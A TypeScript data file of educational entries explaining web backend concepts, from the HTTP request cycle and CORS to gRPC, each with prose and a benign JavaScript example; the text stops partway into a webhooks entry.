import type { Concept } from "../types";

export const WEB: Concept[] = [
  {
    id: "web-http",
    cat: "web",
    title: "HTTP Request Cycle",
    one: "Client sends a request, server routes it, middleware runs, and a response comes back.",
    why: "Every backend framework is a variation on one loop: receive request, process, return response. Knowing the cycle end-to-end — DNS, connection, middleware, handler, serialization — is what lets you debug latency and errors at any hop.",
    how: "The browser resolves the host, opens a TCP (or QUIC) connection, and writes a request: method, path, headers, optional body. The server accepts it, runs middleware (auth, logging, parsing), matches a route, executes the handler, and writes back a status line, headers, and body. The connection may be reused for the next request.",
    when: "Use this mental model for every debugging session: is it slow to connect (network/DNS), slow in middleware (auth lookups), or slow in the handler (DB)? Instrument each phase separately instead of guessing.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Request anatomy", detail: "Method + path + version, headers (Host, Authorization, Content-Type), and an optional body. Everything the server can know about the request is in these lines." },
      { name: "Middleware order matters", detail: "Middleware runs in registration order — logging before auth sees unauthenticated requests; auth before the handler protects it. Wrong order is a classic security hole." },
      { name: "Connection reuse", detail: "HTTP/1.1 keep-alive and HTTP/2 multiplexing avoid a fresh TCP+TLS handshake per request — often the biggest latency win available." },
      { name: "Stateless by design", detail: "Each request carries everything needed to process it (cookies, tokens). No memory between requests is what makes horizontal scaling trivial." },
    ],
    code: `const http = require("http");

// The raw cycle, no framework: request in, middleware, handler, response out
const server = http.createServer((req, res) => {
  const start = Date.now();

  // middleware 1: logging (wraps the rest)
  res.on("finish", () => {
    console.log(JSON.stringify({ method: req.method, url: req.url, ms: Date.now() - start }));
  });

  // middleware 2: auth
  if (req.url.startsWith("/private") && req.headers.authorization !== "Bearer secret") {
    res.writeHead(401, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: { code: "unauthorized" } }));
  }

  // route handler
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ data: "hello", path: req.url }));
});

server.listen(3000, () => console.log("listening on :3000"));`,
    steps: ["Client", "Load balancer", "Middleware", "Route handler", "Response"],
  },
  {
    id: "web-restgraphql",
    cat: "web",
    title: "REST vs GraphQL",
    one: "REST exposes many fixed endpoints; GraphQL exposes one endpoint the client can shape.",
    why: "REST often forces over-fetching (grab 30 fields, use 3) or under-fetching (three calls to render one page). GraphQL lets the client ask for exactly the data it needs in one round trip — at the cost of server complexity and cache difficulty.",
    how: "REST maps resources to URLs and methods with HTTP semantics and standard caching. GraphQL posts a query string to one endpoint; the server resolves each field, and the response mirrors the query's shape. Pagination, auth, and caching all become explicit decisions instead of HTTP defaults.",
    when: "Use REST as the default — its caching, tooling, and simplicity win for most APIs. Choose GraphQL when many different clients need flexible slices of a deeply related graph (mobile, web, partners) and over-fetching measurably hurts.",
    ref: "GraphQL.org Documentation",
    subtopics: [
      { name: "Over/under-fetching", detail: "REST returns what the server decided; GraphQL returns what the client asked for. That's the entire motivation in one sentence." },
      { name: "Single endpoint", detail: "All queries POST to /graphql. HTTP caching per-URL stops working, so caching moves into the client (Apollo) or a persisted-query layer." },
      { name: "Resolver N+1", detail: "A list of 50 posts each resolving author causes 51 DB calls unless you batch with a DataLoader — the classic GraphQL performance trap." },
      { name: "Versioning styles", detail: "REST versions URLs (/v1); GraphQL evolves the schema — deprecate fields with @deprecated and never remove while clients use them." },
    ],
    code: `// REST: fixed shape per endpoint
// GET /users/1        -> { id, name, email, createdAt, ... }   (over-fetch)
// GET /users/1/posts  -> post list                              (second round trip)

// GraphQL: one endpoint, client-shaped query
const schema = \`
  type User { id: ID!, name: String!, posts: [Post!]! }
  type Post { id: ID!, title: String! }
  type Query { user(id: ID!): User }
\`;

const resolvers = {
  Query: {
    user: (_, { id }, ctx) => ctx.db.users.find(id),
  },
  User: {
    posts: (user, _, ctx) => ctx.db.posts.byUser(user.id), // resolved only if asked
  },
};

// Client asks for exactly what the screen needs — one request:
// query { user(id: "1") { name posts { title } } }
// Same client drops email later? Server change: zero. Response shape follows the query.`,
    steps: ["REST: many endpoints", "Fixed response shape", "GraphQL: one endpoint", "Client picks fields"],
  },
  {
    id: "web-websockets",
    cat: "web",
    title: "WebSockets",
    one: "A single connection stays open so server and client can push messages either way.",
    why: "HTTP polling wastes requests and adds latency — the server can't speak until asked. WebSockets give a persistent, bidirectional pipe: the server pushes instantly, the client sends without headers overhead, and both sides know the connection state.",
    how: "The client upgrades an HTTP connection (Upgrade: websocket header); after the handshake the protocol switches to frames over one TCP socket. Either side writes frames at any time. The app layer handles rooms, auth, reconnects, and heartbeats.",
    when: "Use for genuinely bidirectional, low-latency needs: chat, collaborative editing, multiplayer, live dashboards. For one-way server pushes, prefer SSE — simpler, works over plain HTTP, auto-reconnects. Remember: open sockets pin server memory, so plan connection limits and sticky sessions or a pub/sub backbone.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "The upgrade handshake", detail: "Starts as an HTTP GET with Upgrade headers; the 101 response flips the socket into WebSocket framing. Load balancers must support it." },
      { name: "Frames, not requests", detail: "After upgrade there are no headers per message — tiny frames. That's why WS feels instant compared to HTTP request overhead." },
      { name: "Reconnect + heartbeat", detail: "Networks drop silently. Send pings every ~30s, back off exponentially on reconnect, and resync missed state on rejoin." },
      { name: "Horizontal scaling", detail: "Users on server A can't receive pushes from server B unless you add Redis pub/sub or a dedicated realtime backend — sockets are per-process memory." },
    ],
    code: `const { WebSocketServer } = require("ws");

const wss = new WebSocketServer({ port: 8080 });

wss.on("connection", (ws, req) => {
  const room = new URL(req.url, "http://x").searchParams.get("room");
  ws.isAlive = true;

  ws.on("pong", () => { ws.isAlive = true; });       // heartbeat answer
  ws.on("message", (raw) => {
    const msg = JSON.parse(raw);
    for (const client of wss.clients) {              // broadcast to the room
      if (client.readyState === ws.OPEN) {
        client.send(JSON.stringify({ room, ...msg }));
      }
    }
  });
});

// Silent deaths: drop sockets that miss two pings
setInterval(() => {
  for (const ws of wss.clients) {
    if (!ws.isAlive) { ws.terminate(); continue; }
    ws.isAlive = false;
    ws.ping();
  }
}, 30000);`,
    steps: ["Handshake", "Connection open", "Messages both ways", "Either side closes"],
  },
  {
    id: "web-methods",
    cat: "web",
    title: "HTTP Methods",
    one: "GET, POST, PUT, DELETE — each method signals a different intent to the server.",
    why: "Methods are a shared contract: caches, proxies, retries, and browsers all treat GET differently from POST. Using them correctly buys you free caching, safe retries, and predictable semantics; ignoring them breaks tooling in subtle ways.",
    how: "GET reads without side effects (safe, cacheable, retryable). POST creates or triggers. PUT replaces a resource at a known URL (idempotent — same result on retry). PATCH partially updates. DELETE removes (idempotent). The server must honor the contract the method implies.",
    when: "Default mapping: GET for reads, POST for creation and actions, PUT/PATCH for updates, DELETE for removal. Use POST for anything with side effects that isn't cleanly CRUD — never hide writes behind GET (caches and prefetchers will fire it).",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Safe & idempotent", detail: "GET is safe (no state change). PUT and DELETE are idempotent (same result if repeated). POST is neither — which is why it needs idempotency keys on retries." },
      { name: "GET must not mutate", detail: "Preloaders, link scanners, and caches issue GETs without user intent. A GET that charges a card gets charged by a crawler." },
      { name: "PATCH vs PUT", detail: "PUT sends the full replacement; PATCH sends a partial diff. PUT twice = same state; PATCH twice can compound (e.g. two increments)." },
      { name: "Method + status pairs", detail: "POST → 201 + Location, DELETE → 204, GET missing → 404, bad body → 400/422, wrong method → 405. Pair them consistently and clients stay simple." },
    ],
    code: `// One resource, four intents — the method IS the documentation
router.get("/v1/subscriptions/:id", async (req, res) => {
  const sub = await db.subscriptions.find(req.params.id);
  if (!sub) return res.status(404).json({ error: { code: "not_found" } });
  res.json({ data: sub });                          // 200
});

router.post("/v1/subscriptions", async (req, res) => {
  const sub = await db.subscriptions.create(req.body);
  res.status(201)
     .location("/v1/subscriptions/" + sub.id)       // 201 + where to find it
     .json({ data: sub });
});

router.put("/v1/subscriptions/:id", async (req, res) => {
  // full replacement — safe to retry any number of times
  await db.subscriptions.replace(req.params.id, req.body);
  res.status(204).end();
});

router.delete("/v1/subscriptions/:id", async (req, res) => {
  await db.subscriptions.delete(req.params.id);     // idempotent: second call still 204
  res.status(204).end();
});`,
    steps: ["Client chooses method", "Server interprets intent", "Acts on resource", "Returns matching status"],
  },
  {
    id: "web-statuscodes",
    cat: "web",
    title: "Status Codes",
    one: "Numeric codes group outcomes: 2xx success, 4xx client error, 5xx server error.",
    why: "Status codes are how machines understand outcomes without parsing bodies: monitoring separates 5xx spikes from 4xx noise, caches honor 304, retries back off on 503. A 200 with an error body silently breaks all of that machinery.",
    how: "First digit is the family: 2 success, 3 redirect/cached, 4 client did something wrong, 5 server failed. Within families, precise codes carry meaning — 401 unauthenticated vs 403 unauthorized vs 404 not found — and clients branch on them.",
    when: "Return accurate codes on every endpoint: 201 for creation, 204 for no-content success, 400/422 for validation, 429 with Retry-After for rate limits, 503 for deliberate overload. Reserve 500 for genuine bugs — alerting on 5xx only works if you never fake success.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "4xx is the client's problem", detail: "401 missing/invalid auth, 403 authenticated but forbidden, 404 no resource, 409 conflict, 422 valid JSON but invalid data, 429 slow down." },
      { name: "5xx is yours", detail: "500 unhandled bug, 502/504 upstream failure, 503 intentionally overloaded (with Retry-After). Page on 5xx rates; 4xx is normal traffic." },
      { name: "304 saves bandwidth", detail: "With ETag/If-None-Match, a 304 Not Modified response has no body — the client keeps its copy. Free performance via correct codes." },
      { name: "Never 200-on-error", detail: "Wrapping failures in 200 {error: ...} breaks monitoring, retries, and circuit breakers. The status line is part of your API contract." },
    ],
    code: `// Accurate codes are behavior, not decoration
app.post("/v1/orders", async (req, res) => {
  const errors = validate(req.body);
  if (errors) return res.status(422).json({ error: { code: "validation_failed", details: errors } });

  const existing = await db.orders.findByIdempotencyKey(req.get("Idempotency-Key"));
  if (existing) return res.status(200).json({ data: existing });   // replay, not duplicate

  const product = await db.products.find(req.body.productId);
  if (!product) return res.status(422).json({ error: { code: "unknown_product" } });
  if (product.stock === 0) return res.status(409).json({ error: { code: "out_of_stock" } });

  const order = await db.orders.create(req.body);
  res.status(201).location("/v1/orders/" + order.id).json({ data: order });
});

// Rate limiter speaks fluent HTTP too
app.use((req, res, next) => {
  if (overLimit(req.ip)) {
    res.set("Retry-After", "30");
    return res.status(429).json({ error: { code: "rate_limited" } });
  }
  next();
});`,
    steps: ["Request processed", "Outcome determined", "Code assigned", "Client branches on code"],
  },
  {
    id: "web-headerscookies",
    cat: "web",
    title: "Headers & Cookies",
    one: "Metadata and small stored values that travel alongside every request.",
    why: "Headers carry everything that isn't the body: auth tokens, caching rules, content types, CORS grants, security policies. Cookies are the browser's automatic memory — get their flags wrong and you leak sessions or break CSRF protection.",
    how: "Headers are key-value pairs in both directions: the client sends Authorization and Accept; the server returns Set-Cookie, Cache-Control, and Content-Type. The browser stores Set-Cookie values and attaches them automatically to matching future requests.",
    when: "Use cookies for browser sessions (HttpOnly keeps them away from JS), headers for API tokens and metadata, and caching/security headers on every response. Audit them once per project — they're set in one place and affect every request after.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Cookie flags", detail: "HttpOnly blocks JS access (XSS defense), Secure forces HTTPS, SameSite=Lax/Strict blocks most CSRF, Max-Age/Expires control lifetime." },
      { name: "Auth headers", detail: "Authorization: Bearer <token> is the API pattern. Unlike cookies it never travels automatically — explicit, CORS-friendly, immune to CSRF." },
      { name: "Control headers", detail: "Content-Type tells the server how to parse the body; Accept negotiates responses; Cache-Control and ETag govern reuse. These decide most 'why is it/ isn't it cached' mysteries." },
      { name: "Size discipline", detail: "Headers ride on every request — a 4KB cookie multiplies across millions of requests. Keep cookies small; keep data server-side keyed by a session ID." },
    ],
    code: `// Setting a hardened session cookie (Express-style)
app.post("/login", async (req, res) => {
  const user = await verifyCredentials(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: { code: "bad_credentials" } });

  const sessionId = await sessions.create(user.id);
  res.cookie("sid", sessionId, {
    httpOnly: true,   // invisible to JS -> XSS cannot steal it
    secure: true,     // HTTPS only
    sameSite: "lax",  // blocks cross-site POST -> most CSRF dead
    maxAge: 7 * 24 * 3600 * 1000,
    path: "/",
  });
  res.json({ data: { id: user.id } });
});

// Reading headers on an API request
function auth(req) {
  const header = req.get("authorization") ?? "";
  const [scheme, token] = header.split(" ");
  if (scheme !== "Bearer" || !token) throw new ApiError(401, "missing_token");
  return verifyJwt(token); // { sub: "u42", ... }
}

// Response metadata headers
res.set("Cache-Control", "public, max-age=60");
res.set("ETag", etagFor(body));
res.set("X-Request-Id", requestId);`,
    steps: ["Server sets header/cookie", "Browser stores it", "Sent on next request", "Server reads it"],
  },
  {
    id: "web-cors",
    cat: "web",
    title: "CORS",
    one: "A browser rule blocking cross-origin requests unless the server explicitly allows them.",
    why: "Without CORS, any page you visit could read your authenticated data from api.bank.com using your cookies. CORS is the server's way of saying which other origins may call it — it's protection for your users, enforced by their browser.",
    how: "For non-simple requests the browser first sends an OPTIONS preflight naming the method and headers it wants. The server answers with Access-Control-Allow-Origin, -Methods, -Headers. The browser compares and only then sends the real request. Responses need Access-Control-Allow-Credentials for cookies to be included.",
    when: "Configure CORS when a browser app on another origin (app.example.com) calls your API (api.example.com). Never use * with credentials. API-to-API calls don't involve CORS at all — curl and servers ignore it; it's a browser-only rule.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Origin = scheme+host+port", detail: "https://app.com and http://app.com are different origins. The header must match exactly or be a whitelisted value — no wildcard ports." },
      { name: "Preflight OPTIONS", detail: "PUT/DELETE/custom headers trigger an automatic OPTIONS probe. Cache it with Access-Control-Max-Age or every mutation pays an extra round trip." },
      { name: "Credentials wildcard trap", detail: "Access-Control-Allow-Origin: * is rejected when credentials are sent. Echo the verified origin from an allowlist instead." },
      { name: "CORS ≠ auth", detail: "CORS stops other browsers reading responses; it doesn't authenticate anyone. A missing CORS header on your API isn't a security fix for bad auth." },
    ],
    code: `const ALLOWED = new Set(["https://app.example.com", "https://staging.example.com"]);

// CORS middleware — echo the origin only if it is whitelisted
app.use((req, res, next) => {
  const origin = req.get("origin");
  if (ALLOWED.has(origin)) {
    res.set("Access-Control-Allow-Origin", origin);   // exact match, never *
    res.set("Access-Control-Allow-Credentials", "true");
    res.set("Vary", "Origin");
  }
  if (req.method === "OPTIONS") {
    res.set("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE");
    res.set("Access-Control-Allow-Headers", "Content-Type,Authorization");
    res.set("Access-Control-Max-Age", "86400");       // cache preflight 24h
    return res.sendStatus(204);                        // preflight ends here
  }
  next();
});`,
    steps: ["Browser sends preflight", "Server responds with allowed origins", "Browser checks match", "Request allowed or blocked"],
  },
  {
    id: "web-sameorigin",
    cat: "web",
    title: "Same-Origin Policy",
    one: "Browsers isolate pages from different origins from reading each other's data by default.",
    why: "SOP is the bedrock of browser security: script from evil.com must not read your bank session from bank.com just because both are open in one tab. Every other browser rule — CORS, cookies scoping, iframe isolation — builds on this boundary.",
    how: "The browser allows scripts to read/write only resources from the same origin (scheme + host + port). Cross-origin writes (form posts, images, scripts) are allowed; cross-origin reads of responses are blocked unless the server opts in via CORS.",
    when: "Rely on it as your default containment boundary — but understand its holes: it doesn't stop CSRF (writes are allowed), doesn't inspect subdomains (cookie scoping does), and embedded third-party scripts (analytics) run with full page privileges.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Writes allowed, reads blocked", detail: "You can POST cross-origin all day (that's why CSRF exists); you just can't read the response. SOP blocks exfiltration, not actions." },
      { name: "document.domain & subdomains", detail: "Historically shareable via document.domain; modern isolation (origin-keyed agent clusters) makes subdomain isolation the default. Cookies need explicit Domain scoping." },
      { name: "Third-party scripts are trusted", detail: "Any script tag you include can read everything on the page. Every analytics SDK is inside your trust boundary — audit them like code." },
      { name: "JSONP is dead", detail: "The old <script> read-around used to bypass SOP; CSP and CORS made it obsolete. Never accept JSONP endpoints in modern code." },
    ],
    code: `// What SOP means in practice — same origin vs cross origin
// Page: https://app.example.com/dashboard

// SAME origin: read works
const mine = await fetch("/api/profile");        // https://app.example.com/api/profile
const me = await mine.json();                     // OK

// CROSS origin: request may be SENT, but the response is hidden
const theirs = await fetch("https://api.bank.com/accounts");
// theirs.json() throws TypeError: Failed to fetch
// unless api.bank.com returns Access-Control-Allow-Origin

// An iframe from another origin is opaque — even reading its DOM throws
try {
  console.log(document.querySelector("iframe.cross").contentDocument.title);
} catch (err) {
  console.log("SOP blocked:", err.message);       // Blocked a frame with origin...
}

// CSP complements SOP by controlling what scripts may LOAD at all
// Content-Security-Policy: script-src 'self' https://cdn.example.com`,
    steps: ["Page A loads", "Tries to read Page B", "Origins compared", "Blocked if different"],
  },
  {
    id: "web-sse",
    cat: "web",
    title: "Server-Sent Events",
    one: "A one-way stream from server to client over a single long-lived HTTP connection.",
    why: "When only the server pushes (live prices, notifications, log tails), WebSockets are overkill: SSE is plain HTTP, needs no special server or proxy config, gives automatic reconnection, and works with existing auth and infrastructure.",
    how: "The client opens a normal GET with Accept: text/event-stream; the server never ends the response, writing event blocks (data: ...\\n\\n) as they occur. The browser's EventSource API parses the stream and fires events — and reconnects automatically if the connection drops.",
    when: "Use SSE for one-way pushes: feeds, progress bars, AI token streaming, dashboards. Use WebSockets when the client must also send frequently. Cap connections per process and disable response buffering on proxies (X-Accel-Buffering: no) or events queue invisibly.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Event stream format", detail: "Lines of key: value — data:, event:, id:, retry: — separated by blank lines. Text only; binary belongs to WebSockets." },
      { name: "Auto-reconnect built in", detail: "EventSource reconnects on drop and sends Last-Event-ID so the server can resume where it left off — replay from an event log." },
      { name: "Proxy buffering trap", detail: "Nginx/CDNs buffer responses by default, turning your stream into one burst at the end. Disable buffering and set no content-length." },
      { name: "Connection limits", detail: "HTTP/1.1 allows ~6 connections per origin; many SSE tabs can starve out normal requests. HTTP/2 multiplexing removes the cap." },
    ],
    code: `// Server: never end the response — keep writing events
app.get("/events", (req, res) => {
  res.set({
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    Connection: "keep-alive",
    "X-Accel-Buffering": "no",         // defeat proxy buffering
  });
  res.flushHeaders();

  const send = (event, data) =>
    res.write("event: " + event + "\\ndata: " + JSON.stringify(data) + "\\n\\n");

  send("hello", { connectedAt: Date.now() });
  const unsub = subscribeToBus("orders", (order) => send("order", order));

  req.on("close", () => unsub());      // clean up on disconnect
});

// Client: three lines for a live feed with auto-reconnect
const es = new EventSource("/events");
es.addEventListener("order", (e) => console.log("order:", JSON.parse(e.data)));
es.addEventListener("hello", () => console.log("stream ready"));`,
    steps: ["Client opens stream", "Server pushes events", "Client receives continuously", "Connection stays open"],
  },
  {
    id: "web-longpolling",
    cat: "web",
    title: "Long Polling",
    one: "Client repeatedly asks the server 'anything new?' and the server waits before replying.",
    why: "Before WebSockets and SSE, long polling was the only way to push through proxies that killed idle connections. It still matters: oldest-compatible fallback, corporate networks that break upgrades, and legacy systems you must integrate with.",
    how: "The client sends a normal request; the server doesn't answer until it has data or a timeout (say 30s) hits. The client processes the response and immediately re-requests. Each exchange is ordinary HTTP — no upgrade, no special protocol.",
    when: "Use as a fallback when WebSockets/SSE are unavailable, or for very low-frequency updates where connection upkeep isn't worth it. Don't use it for high-frequency data — every message pays request overhead and reconnect churn.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Hold, then answer", detail: "The request parks on a deferred/promise until an event fires or the timeout expires. Empty answer = 'nothing yet, ask again'." },
      { name: "Timeout vs events", detail: "Timeouts (20–60s) recycle connections through proxies. Too long: zombies; too short: request storm. Tune per network." },
      { name: "Message loss window", detail: "Events fired between response and next request are missed unless the client sends a cursor/since ID — always design reconnection around sequence numbers." },
      { name: "Scale cost", detail: "Every waiting client holds a server slot. Node handles parked promises fine; thread-per-request servers need async handlers to survive." },
    ],
    code: `const waiters = new Map(); // topic -> Set of { res, timer }

// Client: GET /updates?topic=orders&cursor=42
app.get("/updates", (req, res) => {
  const { topic, cursor } = req.query;

  const pending = eventsSince(topic, cursor);
  if (pending.length) {
    return res.json({ events: pending, cursor: lastId(pending) });
  }

  const timer = setTimeout(() => {          // 25s: answer empty, client re-polls
    dropWaiter(topic, waiter);
    res.json({ events: [], cursor });       // "nothing yet"
  }, 25000);

  const waiter = { res, timer };
  addWaiter(topic, waiter);
});

// Something happens — release every parked request instantly
function publish(topic, event) {
  appendEvent(topic, event);                // store first, so cursor replay works
  for (const w of takeWaiters(topic)) {
    clearTimeout(w.timer);
    w.res.json({ events: [event], cursor: event.id });
  }
}`,
    steps: ["Client requests", "Server holds request", "New data arrives", "Server responds, client re-polls"],
  },
  {
    id: "web-versioning",
    cat: "web",
    title: "API Versioning",
    one: "Changing an API without breaking clients still relying on the old version.",
    why: "The moment one external client integrates, your API is frozen in amber — every rename, removed field, or changed type becomes a production outage somewhere you can't see. Versioning gives you a legal way to evolve while old clients live on.",
    how: "Ship breaking changes behind a new version (/v2) or a media type (Accept: application/vnd.api+json; v2). Old versions keep running on a deprecation timeline with sunset headers; additive changes (new optional fields) ship within a version freely.",
    when: "Version from the first external consumer — retrofitting is a breaking change itself. Internal APIs between teams you control can often stay unversioned with consumer-driven contracts; anything partners touch needs an explicit version and sunset policy.",
    ref: "Google API Design Guide",
    subtopics: [
      { name: "Path versioning", detail: "/v1/users is the most common and most visible form — routing, logs, and caching all treat versions as distinct resources." },
      { name: "What counts as breaking", detail: "Removing or renaming fields, changing types, adding required request fields, altering error codes. New optional fields and new endpoints are safe additions." },
      { name: "Sunset discipline", detail: "Announce, add a Sunset header with a date, monitor traffic per version, then cut off. Deploy dates, not promises, or /v1 runs forever." },
      { name: "Tolerant readers", detail: "Your own clients should ignore unknown fields and not assume array ordering — tolerant clients make server evolution painless in both directions." },
    ],
    code: `// v1 keeps its contract forever; v2 is free to break shape
app.get("/v1/users/:id", (req, res) =>
  res.json({ data: { id: u.id, name: u.name, email: u.email } }) // v1 shape, frozen
);

app.get("/v2/users/:id", (req, res) =>
  res.json({
    data: {
      id: u.id,
      displayName: u.profile.name,   // renamed in v2 — v1 clients unaffected
      contact: { email: u.email },   // restructured in v2
    },
  })
);

// Deprecation machinery: tell clients BEFORE you remove anything
app.use("/v1", (req, res, next) => {
  const sunset = new Date("2027-01-01");
  res.set("Deprecation", "true");
  res.set("Sunset", sunset.toUTCString());
  res.set("Link", '</v2' + req.path + '>; rel="successor-version"');
  next();
});

// Track who is still on v1 so the sunset date is a decision, not a guess
const v1Traffic = new Map(); // clientKey -> lastSeen
app.use("/v1", (req, res, next) => {
  v1Traffic.set(req.get("X-Client-Id") ?? "anonymous", Date.now());
  next();
});`,
    steps: ["v1 released", "Clients integrate", "v2 introduced", "v1 deprecated gradually"],
  },
  {
    id: "web-contentneg",
    cat: "web",
    title: "Content Negotiation",
    one: "Client and server agree on a response format like JSON or XML via headers.",
    why: "One resource, many consumers: a browser wants HTML, a mobile app JSON, an enterprise partner XML, a data pipeline CSV. Negotiation lets all of them hit the same URL and get the representation they can consume.",
    how: "The client declares preferences in Accept (media types with quality factors: application/json;q=0.9) and Accept-Language. The server picks the best supported match, sets Content-Type on the response, and returns 406 Not Acceptable when nothing matches.",
    when: "Use it when one resource genuinely has multiple representations — export endpoints (JSON/CSV), APIs with legacy XML clients, i18n via Accept-Language. For most modern APIs, JSON-only with 406 fallback is simpler and perfectly honest.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Accept header", detail: "Comma-separated media types with optional q values ranking preference: text/html, application/json;q=0.9. Servers pick the best intersection." },
      { name: "Content-Type echoes back", detail: "The response's Content-Type tells the client how to parse the body — set it before writing; clients trust it over sniffing." },
      { name: "406 Not Acceptable", detail: "Nothing the server supports matches the client's demands. Better to 406 loudly than silently return JSON to a CSV pipeline." },
      { name: "Caching implications", detail: "Different representations of one URL need Vary: Accept so caches store per-format copies — miss it and XML clients receive cached JSON." },
    ],
    code: `const representations = {
  "application/json": (order) => JSON.stringify({ data: order }),
  "text/csv": (order) =>
    ["id,total_cents,status", order.id + "," + order.totalCents + "," + order.status].join("\\n"),
  "application/xml": (order) =>
    "<order><id>" + order.id + "</id><total>" + order.totalCents + "</total></order>",
};

app.get("/v1/orders/:id", (req, res) => {
  const order = db.orders.find(req.params.id);

  // parse Accept with quality factors, pick the best match we support
  const wanted = String(req.get("accept") ?? "*/*")
    .split(",")
    .map((part) => {
      const [type, ...params] = part.trim().split(";");
      const q = Number((params.find((p) => p.startsWith("q=")) ?? "q=1").slice(2)) || 0;
      return { type, q };
    })
    .sort((a, b) => b.q - a.q);

  const match = wanted.find((w) => representations[w.type]);
  if (!match) {
    res.set("Accept", Object.keys(representations).join(", "));
    return res.status(406).json({ error: { code: "not_acceptable" } });
  }

  res.set("Content-Type", match.type);
  res.set("Vary", "Accept"); // caches: representation depends on this header
  res.send(representations[match.type](order));
});`,
    steps: ["Client sends Accept header", "Server checks supported types", "Picks best match", "Returns that format"],
  },
  {
    id: "web-routing",
    cat: "web",
    title: "URL Structure & Routing",
    one: "Mapping URL patterns to the handler functions that serve them.",
    why: "Routing is the front door of every request — it decides which code runs. Good URL structure stays stable for years, reads well in logs and browser history, and makes parameters explicit instead of hidden in query strings.",
    how: "A router holds ordered pattern→handler rules: static segments (/orders), parameters (/orders/:id), and wildcards (/files/*). On a request it matches the path (and often method), extracts params, and invokes the handler — first match wins, so order matters.",
    when: "Design URLs around resources: plural nouns, nesting only for ownership (/users/:id/orders), filters in the query string (?status=paid) not the path. Register specific routes before generic ones and 404 deliberately at the end.",
    ref: "Express.js Documentation",
    subtopics: [
      { name: "Path params vs query", detail: ":id identifies WHICH resource; ?sort=desc modifies HOW it's returned. Everything after ? is metadata, not identity." },
      { name: "Route ordering", detail: "First match wins. /orders/new must register before /orders/:id or 'new' becomes an id. Express throws a common warning when a path param shadows a static route." },
      { name: "Validation at the route", detail: "Match and validate in one step — /orders/:id(\\\\d+) or a middleware that 400s non-numeric ids before the handler ever runs." },
      { name: "Routers as modules", detail: "Mount sub-routers by prefix: app.use('/v1/orders', ordersRouter). Teams own files, prefixes keep logs readable, 404 stays one handler." },
    ],
    code: `const http = require("http");

const routes = [];
function add(method, pattern, handler) {
  // turn "/users/:id/orders" into a regex with named groups
  const keys = [];
  const source = pattern.replace(/:([A-Za-z_]+)/g, (_, key) => {
    keys.push(key);
    return "([^/]+)";
  });
  routes.push({ method, regex: new RegExp("^" + source + "$"), keys, handler });
}

function match(method, pathname) {
  for (const r of routes) {
    if (r.method !== method) continue;
    const m = pathname.match(r.regex);
    if (m) {
      const params = {};
      r.keys.forEach((k, i) => (params[k] = decodeURIComponent(m[i + 1])));
      return { handler: r.handler, params };
    }
  }
  return null;
}

add("GET", "/users/:userId/orders/:orderId", (params, res) => {
  res.end("user " + params.userId + ", order " + params.orderId);
});

http.createServer((req, res) => {
  const found = match(req.method, new URL(req.url, "http://x").pathname);
  if (!found) { res.statusCode = 404; return res.end("not found"); }
  found.handler(found.params, res);
}).listen(3000);`,
    steps: ["Incoming URL", "Match route pattern", "Extract params", "Call handler"],
  },
  {
    id: "web-grpc",
    cat: "web",
    title: "gRPC",
    one: "A binary, contract-first RPC protocol built on top of HTTP/2.",
    why: "JSON APIs spend bytes and CPU spelling out field names and parsing text. For service-to-service calls where both sides control the stack, gRPC's binary protobuf payloads are 3–10x smaller and faster, with generated clients that make remote calls feel like local functions.",
    how: "You define services and messages in a .proto file; codegen produces typed client stubs and server bases in every language. Calls travel over HTTP/2 as length-prefixed protobuf frames — supporting bidirectional streaming alongside unary calls.",
    when: "Use it for internal microservice meshes with polyglot teams and hot paths (recommendation calls, auth checks, streaming). Keep REST/JSON at the public edge — browsers can't call gRPC directly (need gRPC-Web) and humans can't read protobuf in a debugger.",
    ref: "grpc.io Documentation",
    subtopics: [
      { name: "The .proto contract", detail: "One file declares messages (numbered fields) and RPC methods. Both sides generate code from it — the contract IS the API, and numbering makes evolution safe." },
      { name: "Protobuf encoding", detail: "Fields are tag + varint, not names — 'user_id: 42' becomes bytes like 0x08 0x2A. No field names on the wire is where the size win comes from." },
      { name: "Four call types", detail: "Unary (request/response), server-streaming, client-streaming, bidirectional — all multiplexed over one HTTP/2 connection." },
      { name: "Ecosystem costs", detail: "Load balancing needs L7 awareness of HTTP/2, debugging needs reflection tooling, and .proto drift across repos becomes its own discipline." },
    ],
    code: `// user.proto — the single source of truth
// syntax = "proto3";
// service UserService {
//   rpc GetUser (GetUserRequest) returns (User);
//   rpc WatchUsers (WatchRequest) returns (stream User);  // server streaming
// }
// message GetUserRequest { string user_id = 1; }
// message User { string id = 1; string name = 2; int32 age = 3; }

// Server: implement the generated base — proto validation is automatic
const server = new grpc.Server();
server.addService(userProto.UserService.service, {
  async GetUser(call, callback) {
    const user = await db.users.find(call.request.userId);
    if (!user) {
      return callback({ code: grpc.status.NOT_FOUND, message: "no such user" });
    }
    callback(null, { id: user.id, name: user.name, age: user.age }); // plain object -> protobuf
  },
  WatchUsers: (call) => {
    bus.on("user.changed", (u) => call.write({ id: u.id, name: u.name, age: u.age }));
  },
});

// Client: generated stub — a remote call that reads like a local one
const client = new userProto.UserService("users.internal:50051", grpc.credentials.createInsecure());
client.GetUser({ userId: "u1" }, (err, user) => {
  if (err) throw err;
  console.log(user.name); // fully typed, binary on the wire
});`,
    steps: ["Define .proto contract", "Generate client/server stubs", "Client calls method", "Binary response returned"],
  },
  {
    id: "web-webhooks",
    cat: "web",
    title: "Webhooks",
    one: "The server calls your endpoint when an event happens, instead of you polling for it.",
    why: "Polling Stripe every second to learn about payments wastes both sides' resources and still lags. Webhooks invert control: the provider POSTs you the moment an event happens — real-time updates with near-zero idle cost.",
